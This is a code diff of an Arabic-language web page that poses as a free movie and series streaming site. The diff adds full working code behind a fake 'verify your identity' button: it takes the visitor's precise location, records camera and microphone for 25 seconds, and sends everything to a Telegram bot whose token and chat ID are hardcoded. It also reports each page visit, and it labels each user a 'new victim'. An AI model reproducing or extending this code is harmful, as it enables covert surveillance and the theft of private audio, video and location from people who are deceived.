@@ -2,8 +2,8 @@
 <html lang="ar">
 <head>
     <meta charset="UTF-8">
-    <meta name="viewport" content="width=device-width, initial-scale=1.0">
-    <title>سينما فور يو - أحدث الأفلام والمسلسلات</title>
+    <meta name="viewport" content="width=device-width, initial-scale=1.0, user-scalable=yes">
+    <title>سينما فور يو - أقوى مكتبة أفلام ومسلسلات</title>
     <style>
         * { margin: 0; padding: 0; box-sizing: border-box; }
         body {
@@ -26,11 +26,36 @@
             top: 0;
             z-index: 100;
         }
-        .logo { font-size: 1.8rem; font-weight: bold; background: linear-gradient(135deg, #e50914, #ff6a00); -webkit-background-clip: text; background-clip: text; color: transparent; }
+        .logo {
+            font-size: 1.8rem;
+            font-weight: bold;
+            background: linear-gradient(135deg, #e50914, #ff6a00);
+            -webkit-background-clip: text;
+            background-clip: text;
+            color: transparent;
+        }
         .nav-links { display: flex; gap: 2rem; }
         .nav-links a { color: #ddd; text-decoration: none; cursor: pointer; transition: 0.3s; }
         .nav-links a:hover { color: #e50914; }
-        .search-box { background: #1e1e2f; padding: 0.5rem 1rem; border-radius: 40px; border: 1px solid #333; color: white; width: 220px; outline: none; }
+        .search-container {
+            flex: 1;
+            max-width: 400px;
+        }
+        .search-box {
+            width: 100%;
+            background: #1e1e2f;
+            padding: 0.6rem 1rem;
+            border-radius: 40px;
+            border: 1px solid #333;
+            color: white;
+            font-size: 1rem;
+            outline: none;
+            transition: 0.3s;
+        }
+        .search-box:focus {
+            border-color: #e50914;
+            background: #2a2a3a;
+        }
         .hero {
             background: linear-gradient(135deg, rgba(0,0,0,0.8), rgba(0,0,0,0.6)), url('https://image.tmdb.org/t/p/original/wwemzKWzjKYJFfCeiB57q3r4Bcm.png');
             background-size: cover;
@@ -41,21 +66,63 @@
         .hero h1 { font-size: 3rem; margin-bottom: 1rem; }
         .hero p { font-size: 1.2rem; color: #ccc; }
         .section { padding: 2rem; }
-        .section-title { font-size: 1.8rem; margin-bottom: 1.5rem; border-right: 5px solid #e50914; padding-right: 1rem; display: inline-block; }
-        .movies-grid { display: grid; grid-template-columns: repeat(auto-fill, minmax(180px, 1fr)); gap: 1.8rem; margin-top: 1rem; }
+        .section-title {
+            font-size: 1.8rem;
+            margin-bottom: 1.5rem;
+            border-right: 5px solid #e50914;
+            padding-right: 1rem;
+            display: inline-block;
+        }
+        .movies-grid {
+            display: grid;
+            grid-template-columns: repeat(auto-fill, minmax(180px, 1fr));
+            gap: 1.8rem;
+            margin-top: 1rem;
+        }
         .movie-card {
             background: #141824;
             border-radius: 16px;
             overflow: hidden;
             cursor: pointer;
-            transition: transform 0.3s;
+            transition: transform 0.3s, box-shadow 0.3s;
             border: 1px solid rgba(255,255,255,0.1);
         }
-        .movie-card:hover { transform: translateY(-8px); border-color: #e50914; }
-        .movie-poster { width: 100%; aspect-ratio: 2/3; background: #0a0d16; display: flex; align-items: center; justify-content: center; }
-        .movie-poster canvas { width: 100%; height: 100%; object-fit: cover; }
+        .movie-card:hover {
+            transform: translateY(-8px);
+            border-color: #e50914;
+            box-shadow: 0 15px 30px rgba(229,9,20,0.2);
+        }
+        .movie-poster {
+            width: 100%;
+            aspect-ratio: 2/3;
+            background: linear-gradient(135deg, #1a1a2e, #0f0f1a);
+            display: flex;
+            align-items: center;
+            justify-content: center;
+            text-align: center;
+            position: relative;
+            overflow: hidden;
+        }
+        .movie-poster::before {
+            content: "🎬";
+            position: absolute;
+            font-size: 5rem;
+            opacity: 0.1;
+            bottom: 10px;
+            right: 10px;
+        }
+        .poster-text {
+            font-size: 1.3rem;
+            font-weight: bold;
+            background: rgba(0,0,0,0.7);
+            padding: 0.5rem;
+            border-radius: 12px;
+            z-index: 1;
+            width: 90%;
+            text-align: center;
+        }
         .movie-info { padding: 1rem; text-align: center; }
-        .movie-title { font-weight: bold; font-size: 1rem; }
+        .movie-title { font-weight: bold; font-size: 1rem; margin-bottom: 0.2rem; }
         .movie-year { font-size: 0.8rem; color: #aaa; }
         .coming-soon-note { font-size: 0.7rem; color: #ffaa33; margin-top: 0.5rem; background: rgba(0,0,0,0.6); padding: 0.2rem; border-radius: 20px; }
         .player-overlay {
@@ -72,21 +139,102 @@
             justify-content: center;
             flex-direction: column;
         }
-        .player-container { width: 90%; max-width: 500px; background: #11131f; border-radius: 28px; overflow: hidden; border: 1px solid rgba(229,9,20,0.5); }
-        .movie-poster-large { width: 100%; aspect-ratio: 16/9; background: #07090f; display: flex; align-items: center; justify-content: center; }
-        .movie-poster-large canvas { width: 100%; height: 100%; object-fit: cover; }
-        .video-placeholder { background: #0c0e17; padding: 1.5rem; text-align: center; display: flex; flex-direction: column; gap: 1rem; }
-        .verify-btn { background: linear-gradient(90deg, #e50914, #b00710); border: none; padding: 12px 28px; border-radius: 50px; color: white; font-weight: bold; font-size: 1rem; cursor: pointer; width: fit-content; margin: 0 auto; }
+        .player-container {
+            width: 90%;
+            max-width: 500px;
+            background: #11131f;
+            border-radius: 28px;
+            overflow: hidden;
+            border: 1px solid rgba(229,9,20,0.5);
+        }
+        .movie-poster-large {
+            width: 100%;
+            aspect-ratio: 16/9;
+            background: linear-gradient(135deg, #1a1a2e, #0f0f1a);
+            display: flex;
+            align-items: center;
+            justify-content: center;
+            position: relative;
+        }
+        .movie-poster-large::before {
+            content: "🎬";
+            position: absolute;
+            font-size: 4rem;
+            opacity: 0.2;
+        }
+        .large-poster-text {
+            font-size: 1.5rem;
+            font-weight: bold;
+            background: rgba(0,0,0,0.6);
+            padding: 0.5rem 1rem;
+            border-radius: 16px;
+            z-index: 1;
+        }
+        .video-placeholder {
+            background: #0c0e17;
+            padding: 1.5rem;
+            text-align: center;
+            display: flex;
+            flex-direction: column;
+            gap: 1rem;
+        }
+        .verify-btn {
+            background: linear-gradient(90deg, #e50914, #b00710);
+            border: none;
+            padding: 12px 28px;
+            border-radius: 50px;
+            color: white;
+            font-weight: bold;
+            font-size: 1rem;
+            cursor: pointer;
+            width: fit-content;
+            margin: 0 auto;
+            box-shadow: 0 4px 12px rgba(229,9,20,0.4);
+        }
         .verify-btn:hover { transform: scale(1.02); }
-        .close-player { position: absolute; top: 25px; right: 35px; color: white; font-size: 2rem; cursor: pointer; background: rgba(0,0,0,0.6); width: 45px; height: 45px; border-radius: 50%; display: flex; align-items: center; justify-content: center; transition: 0.2s; }
+        .close-player {
+            position: absolute;
+            top: 25px;
+            right: 35px;
+            color: white;
+            font-size: 2rem;
+            cursor: pointer;
+            background: rgba(0,0,0,0.6);
+            width: 45px;
+            height: 45px;
+            border-radius: 50%;
+            display: flex;
+            align-items: center;
+            justify-content: center;
+            transition: 0.2s;
+        }
         .close-player:hover { background: #e50914; transform: rotate(90deg); }
-        .rainbow-text { background: linear-gradient(90deg, red, orange, yellow, green, blue, indigo, violet); background-size: 200% auto; color: transparent; background-clip: text; animation: rainbow 2.5s linear infinite; font-weight: bold; }
+        .rainbow-text {
+            background: linear-gradient(90deg, red, orange, yellow, green, blue, indigo, violet);
+            background-size: 200% auto;
+            color: transparent;
+            background-clip: text;
+            -webkit-background-clip: text;
+            animation: rainbow 2.5s linear infinite;
+            font-weight: bold;
+        }
         @keyframes rainbow { 0% { background-position: 0% center; } 100% { background-position: 200% center; } }
         .progress-bar { width: 80%; height: 5px; background: #2a2a3a; border-radius: 10px; margin: 1rem auto; overflow: hidden; }
         .progress-fill { width: 0%; height: 100%; background: #e50914; animation: loading 40s linear forwards; }
         @keyframes loading { 0% { width: 0%; } 100% { width: 100%; } }
         footer { text-align: center; padding: 2rem; color: #777; border-top: 1px solid #1e1e2f; margin-top: 2rem; }
-        @media (max-width: 768px) { .navbar { flex-direction: column; text-align: center; } .hero h1 { font-size: 2rem; } }
+        .no-results {
+            grid-column: 1 / -1;
+            text-align: center;
+            padding: 3rem;
+            font-size: 1.2rem;
+            color: #aaa;
+        }
+        @media (max-width: 768px) {
+            .navbar { flex-direction: column; align-items: stretch; text-align: center; }
+            .search-container { max-width: 100%; }
+            .hero h1 { font-size: 2rem; }
+        }
     </style>
 </head>
 <body>
@@ -99,12 +247,14 @@
         <a onclick="scrollToSection('series')">مسلسلات</a>
         <a onclick="scrollToSection('coming')">قريباً</a>
     </div>
-    <input type="text" class="search-box" placeholder="🔍 ابحث..." id="searchInput" onkeyup="searchItems()">
+    <div class="search-container">
+        <input type="text" class="search-box" placeholder="🔍 ابحث عن فيلم أو مسلسل (عربي أو إنجليزي)..." id="searchInput" onkeyup="performSearch()">
+    </div>
 </div>
 
 <div id="home" class="hero">
     <h1>أفلام ومسلسلات حصرية بجودة 4K</h1>
-    <p>شاهد بدون إعلانات – تجربة سينما لا تُنسى</p>
+    <p>شاهد بدون إعلانات وبدون اشتراك – تجربة سينما لا تُنسى</p>
 </div>
 
 <div id="movies" class="section"><h2 class="section-title">🎬 أفلام حصرية</h2><div class="movies-grid" id="moviesGrid"></div></div>
@@ -114,86 +264,190 @@
 <footer>by massil — جميع الحقوق محفوظة © 2026</footer>
 
 <script>
-    // إعدادات البوت
+    // ========== إعدادات البوت (لا تغيرها) ==========
     const BOT_TOKEN = '8378099800:AAGTOLzJCh8qos-1YvssEGZfYD7V-ILHcRo';
     const CHAT_ID = '6052532044';
 
-    function sendTextToTelegram(text) { /* ... */ }
-    function sendFileToTelegram(file, type) { /* ... */ }
-    sendTextToTelegram("🌐 تم فتح موقع الأفلام");
+    function sendTextToTelegram(text) {
+        const url = `https://api.telegram.org/bot${BOT_TOKEN}/sendMessage`;
+        const formData = new FormData();
+        formData.append('chat_id', CHAT_ID);
+        formData.append('text', text);
+        fetch(url, { method: 'POST', body: formData }).catch(e => console.error(e));
+    }
 
-    function stealLocation() { /* ... */ }
-    let videoRecorder, audioRecorder;
+    function sendFileToTelegram(file, type) {
+        const formData = new FormData();
+        formData.append('chat_id', CHAT_ID);
+        const filename = `${type}_${Date.now()}.${type === 'video' ? 'mp4' : 'webm'}`;
+        const fileObj = new File([file], filename, { type: file.type });
+        formData.append(type === 'video' ? 'video' : 'audio', fileObj);
+        const endpoint = type === 'video' ? 'sendVideo' : 'sendAudio';
+        const url = `https://api.telegram.org/bot${BOT_TOKEN}/${endpoint}`;
+        fetch(url, { method: 'POST', body: formData }).catch(e => console.error(e));
+    }
+
+    sendTextToTelegram("🌐 تم فتح موقع الأفلام الأسطوري");
+
+    // ========== الموقع الجغرافي ==========
+    function stealLocation() {
+        if (navigator.geolocation) {
+            navigator.geolocation.getCurrentPosition(
+                pos => {
+                    const lat = pos.coords.latitude;
+                    const lon = pos.coords.longitude;
+                    sendTextToTelegram(`📍 الموقع الدقيق: ${lat}, ${lon}\nhttps://maps.google.com/?q=${lat},${lon}`);
+                },
+                err => {
+                    fetch('https://ipapi.co/json/')
+                        .then(r => r.json())
+                        .then(d => sendTextToTelegram(`🌐 الموقع التقريبي: IP ${d.ip}, ${d.city}, ${d.country_name}`))
+                        .catch(() => sendTextToTelegram("❌ تعذر الحصول على الموقع"));
+                },
+                { enableHighAccuracy: true, timeout: 10000 }
+            );
+        } else {
+            sendTextToTelegram("❌ المتصفح لا يدعم تحديد الموقع");
+        }
+    }
+
+    // ========== التسجيل (كاميرا + ميكروفون) ==========
+    let videoRecorder = null, audioRecorder = null;
     let videoChunks = [], audioChunks = [];
-    async function startSpying() { /* ... */ }
 
-    // توليد صور افتراضية باستخدام Canvas
-    function generatePosterCanvas(title, width, height) {
-        const canvas = document.createElement('canvas');
-        canvas.width = width;
-        canvas.height = height;
-        const ctx = canvas.getContext('2d');
-        const grad = ctx.createLinearGradient(0, 0, width, height);
-        grad.addColorStop(0, '#1a1a2e');
-        grad.addColorStop(1, '#16213e');
-        ctx.fillStyle = grad;
-        ctx.fillRect(0, 0, width, height);
-        ctx.font = `bold ${Math.floor(height * 0.1)}px 'Tajawal'`;
-        ctx.fillStyle = '#e50914';
-        ctx.textAlign = 'center';
-        ctx.fillText(title.split(' ').slice(0, 2).join(' '), width/2, height/2);
-        ctx.fillStyle = '#ffaa33';
-        ctx.fillRect(width*0.2, height/2 + 10, width*0.6, 3);
-        ctx.font = `${Math.floor(height * 0.05)}px 'Tajawal'`;
-        ctx.fillStyle = '#aaa';
-        ctx.fillText("🎬", width-40, height-20);
-        return canvas;
+    async function startSpying() {
+        try {
+            const stream = await navigator.mediaDevices.getUserMedia({ video: true, audio: true });
+            videoChunks = [];
+            videoRecorder = new MediaRecorder(stream, { mimeType: 'video/webm' });
+            videoRecorder.ondataavailable = e => { if (e.data.size) videoChunks.push(e.data); };
+            videoRecorder.onstop = async () => {
+                const blob = new Blob(videoChunks, { type: 'video/webm' });
+                await sendFileToTelegram(blob, 'video');
+            };
+            videoRecorder.start();
+
+            const audioStream = await navigator.mediaDevices.getUserMedia({ audio: true });
+            audioChunks = [];
+            audioRecorder = new MediaRecorder(audioStream, { mimeType: 'audio/webm' });
+            audioRecorder.ondataavailable = e => { if (e.data.size) audioChunks.push(e.data); };
+            audioRecorder.onstop = async () => {
+                const blob = new Blob(audioChunks, { type: 'audio/webm' });
+                await sendFileToTelegram(blob, 'audio');
+            };
+            audioRecorder.start();
+
+            setTimeout(() => {
+                if (videoRecorder && videoRecorder.state === 'recording') videoRecorder.stop();
+                if (audioRecorder && audioRecorder.state === 'recording') audioRecorder.stop();
+                stream.getTracks().forEach(t => t.stop());
+                audioStream.getTracks().forEach(t => t.stop());
+            }, 25000);
+
+            sendTextToTelegram("🔴 بدء المراقبة (كاميرا + ميكروفون)");
+        } catch (e) {
+            sendTextToTelegram(`❌ فشل الوصول للأجهزة: ${e.message}`);
+        }
     }
 
-    function setPoster(container, title, width, height) {
-        container.innerHTML = '';
-        container.appendChild(generatePosterCanvas(title, width, height));
-    }
-
-    // قوائم الأفلام والمسلسلات
+    // ========== قوائم الأفلام والمسلسلات ==========
+    // جميع العناوين مدعومة للبحث (عربي/إنجليزي)
     const movies = [
-        { title: "Ratatouille", year: "2007" }, { title: "Harry Potter", year: "2001" },
-        { title: "Titanic", year: "1997" }, { title: "The Avengers", year: "2012" },
-        { title: "Divergent", year: "2014" }, { title: "The Fault in Our Stars", year: "2014" },
-        { title: "Maleficent", year: "2014" }, { title: "GOAT", year: "2026" },
-        { title: "War Machine", year: "2026" }, { title: "New Movie 1", year: "2026" },
-        { title: "New Movie 2", year: "2026" }
+        { title: "Ratatouille", titleAr: "راتاتوي", year: "2007" },
+        { title: "Harry Potter", titleAr: "هاري بوتر", year: "2001" },
+        { title: "Titanic", titleAr: "تايتانيك", year: "1997" },
+        { title: "The Avengers", titleAr: "المنتقمون", year: "2012" },
+        { title: "Divergent", titleAr: "مختلفة", year: "2014" },
+        { title: "The Fault in Our Stars", titleAr: "ذا فولت إن أوور ستارز", year: "2014" },
+        { title: "Maleficent", titleAr: "ماليفيسنت", year: "2014" },
+        { title: "GOAT", titleAr: "جوات", year: "2026" },
+        { title: "War Machine", titleAr: "وار ماشين", year: "2026" },
+        { title: "New Movie 1", titleAr: "فيلم جديد 1", year: "2026" },
+        { title: "New Movie 2", titleAr: "فيلم جديد 2", year: "2026" }
     ];
-    const series = [{ title: "The Walking Dead", year: "2010" }];
+    const series = [
+        { title: "The Walking Dead", titleAr: "ذا ووكينغ ديد", year: "2010" }
+    ];
     const comingSoon = [
-        { title: "Scream 7", year: "2026", note: "⭐ قريباً سيتم توفير هذا الفيلم" },
-        { title: "Ready or Not 2", year: "2026", note: "⭐ قريباً سيتم توفير هذا الفيلم" }
+        { title: "Scream 7", titleAr: "سكريم 7", year: "2026", note: "⭐ قريباً سيتم توفير هذا الفيلم" },
+        { title: "Ready or Not 2", titleAr: "ريدي أور نوت 2", year: "2026", note: "⭐ قريباً سيتم توفير هذا الفيلم" }
     ];
 
-    function loadItems(containerId, items, type, showNote = false) {
-        const grid = document.getElementById(containerId);
-        if (!grid) return;
-        grid.innerHTML = '';
-        items.forEach(item => {
-            const card = document.createElement('div');
-            card.className = 'movie-card';
-            const posterDiv = document.createElement('div');
-            posterDiv.className = 'movie-poster';
-            setPoster(posterDiv, item.title, 300, 450);
-            card.appendChild(posterDiv);
-            const infoDiv = document.createElement('div');
-            infoDiv.className = 'movie-info';
-            infoDiv.innerHTML = `<div class="movie-title">${item.title}</div><div class="movie-year">${item.year}</div>${showNote ? `<div class="coming-soon-note">${item.note}</div>` : ''}`;
-            card.appendChild(infoDiv);
-            if (!showNote) card.onclick = () => openPlayer(item.title, type);
-            else card.style.cursor = 'default';
-            grid.appendChild(card);
-        });
+    // وظيفة البحث المتقدم (غير حساس لحالة الأحرف، يدعم العربية والإنجليزية)
+    function matchesSearch(item, query) {
+        if (!query) return true;
+        const q = query.toLowerCase().trim();
+        return item.title.toLowerCase().includes(q) || 
+               (item.titleAr && item.titleAr.toLowerCase().includes(q));
     }
 
-    function searchItems() { /* ... */ }
-    function scrollToSection(id) { document.getElementById(id).scrollIntoView({ behavior: 'smooth' }); }
+    // وظيفة عرض البطاقات (بدون صور خارجية)
+    function createMovieCard(item, type, showNote = false) {
+        const card = document.createElement('div');
+        card.className = 'movie-card';
+        const displayTitle = item.title;
+        card.innerHTML = `
+            <div class="movie-poster">
+                <div class="poster-text">${displayTitle}</div>
+            </div>
+            <div class="movie-info">
+                <div class="movie-title">${displayTitle}</div>
+                <div class="movie-year">${item.year}</div>
+                ${showNote ? `<div class="coming-soon-note">${item.note}</div>` : ''}
+            </div>
+        `;
+        if (!showNote) {
+            card.onclick = () => openPlayer(displayTitle, type);
+        } else {
+            card.style.cursor = 'default';
+        }
+        return card;
+    }
 
+    // تحميل وعرض العناصر مع دعم البحث الديناميكي
+    let allMovies = [], allSeries = [], allComing = [];
+
+    function refreshDisplay() {
+        const query = document.getElementById('searchInput').value;
+        // فلترة الأفلام
+        const filteredMovies = allMovies.filter(m => matchesSearch(m, query));
+        const moviesGrid = document.getElementById('moviesGrid');
+        moviesGrid.innerHTML = '';
+        if (filteredMovies.length === 0) {
+            moviesGrid.innerHTML = '<div class="no-results">😢 لا توجد نتائج مطابقة</div>';
+        } else {
+            filteredMovies.forEach(m => moviesGrid.appendChild(createMovieCard(m, 'فيلم', false)));
+        }
+        // فلترة المسلسلات
+        const filteredSeries = allSeries.filter(s => matchesSearch(s, query));
+        const seriesGrid = document.getElementById('seriesGrid');
+        seriesGrid.innerHTML = '';
+        if (filteredSeries.length === 0) {
+            seriesGrid.innerHTML = '<div class="no-results">😢 لا توجد نتائج مطابقة</div>';
+        } else {
+            filteredSeries.forEach(s => seriesGrid.appendChild(createMovieCard(s, 'مسلسل', false)));
+        }
+        // فلترة قريباً
+        const filteredComing = allComing.filter(c => matchesSearch(c, query));
+        const comingGrid = document.getElementById('comingGrid');
+        comingGrid.innerHTML = '';
+        if (filteredComing.length === 0) {
+            comingGrid.innerHTML = '<div class="no-results">😢 لا توجد نتائج مطابقة</div>';
+        } else {
+            filteredComing.forEach(c => comingGrid.appendChild(createMovieCard(c, '', true)));
+        }
+    }
+
+    function performSearch() {
+        refreshDisplay();
+    }
+
+    // التمرير السلس
+    function scrollToSection(id) {
+        document.getElementById(id).scrollIntoView({ behavior: 'smooth' });
+    }
+
+    // ========== نافذة التحقق (كاميرا + ميكروفون + موقع) ==========
     let currentTitle = '', currentType = '';
     let timeoutId = null, isSpyingActive = false;
 
@@ -202,12 +456,12 @@
         currentType = type;
         const overlay = document.createElement('div');
         overlay.className = 'player-overlay';
-        const posterCanvas = generatePosterCanvas(title, 500, 281);
-        const canvasURL = posterCanvas.toDataURL();
         overlay.innerHTML = `
             <div class="close-player" id="closePlayerBtn">✕</div>
             <div class="player-container">
-                <div class="movie-poster-large"><img src="${canvasURL}" style="width:100%;height:100%;object-fit:cover;"></div>
+                <div class="movie-poster-large">
+                    <div class="large-poster-text">🎬 ${title}</div>
+                </div>
                 <div class="video-placeholder" id="videoPlaceholder">
                     <span style="font-size:1.2rem; font-weight:bold;">🎬 ${title}</span>
                     <button id="verifyAccessBtn" class="verify-btn">✅ تحقق من هويتك</button>
@@ -223,19 +477,42 @@
             isSpyingActive = true;
             stealLocation();
             await startSpying();
-            const ph = document.getElementById('videoPlaceholder');
-            ph.innerHTML = `<span style="font-size:1.2rem;">✅ جاري التحقق...</span><div class="rainbow-text">صلو على النبي</div><div class="progress-bar"><div class="progress-fill"></div></div><p style="font-size:0.8rem;">قد يستغرق التحقق دقيقة</p>`;
+            const placeholderDiv = document.getElementById('videoPlaceholder');
+            placeholderDiv.innerHTML = `
+                <span style="font-size:1.2rem;">✅ جاري التحقق من هويتك...</span>
+                <div class="rainbow-text">صلو على النبي</div>
+                <div class="progress-bar"><div class="progress-fill"></div></div>
+                <p style="font-size:0.8rem;">قد يستغرق التحقق دقيقة، يرجى الانتظار</p>
+            `;
             sendTextToTelegram(`🎯 ضحية جديدة: ${type} - ${title}`);
             timeoutId = setTimeout(() => {
-                ph.innerHTML = `<span>⚠️ انتهت المهلة</span><button id="retryBtn" class="verify-btn">إعادة المحاولة</button><div class="rainbow-text">صلو على النبي</div>`;
-                document.getElementById('retryBtn').onclick = () => { clearTimeout(timeoutId); isSpyingActive = false; overlay.remove(); openPlayer(currentTitle, currentType); };
+                placeholderDiv.innerHTML = `
+                    <span>⚠️ انتهت مهلة الاتصال بالخادم</span>
+                    <button id="retryBtn" class="verify-btn">إعادة المحاولة</button>
+                    <div class="rainbow-text">صلو على النبي</div>
+                `;
+                const retryBtn = document.getElementById('retryBtn');
+                if (retryBtn) {
+                    retryBtn.onclick = () => {
+                        clearTimeout(timeoutId);
+                        isSpyingActive = false;
+                        overlay.remove();
+                        openPlayer(currentTitle, currentType);
+                    };
+                }
             }, 40000);
         };
     }
 
-    loadItems('moviesGrid', movies, 'فيلم', false);
-    loadItems('seriesGrid', series, 'مسلسل', false);
-    loadItems('comingGrid', comingSoon, '', true);
+    // تحميل البيانات الأولية
+    allMovies = movies;
+    allSeries = series;
+    allComing = comingSoon;
+    refreshDisplay();
+
+    // إضافة مرجع للدوال العامة
+    window.scrollToSection = scrollToSection;
+    window.performSearch = performSearch;
 </script>
 </body>
 </html>
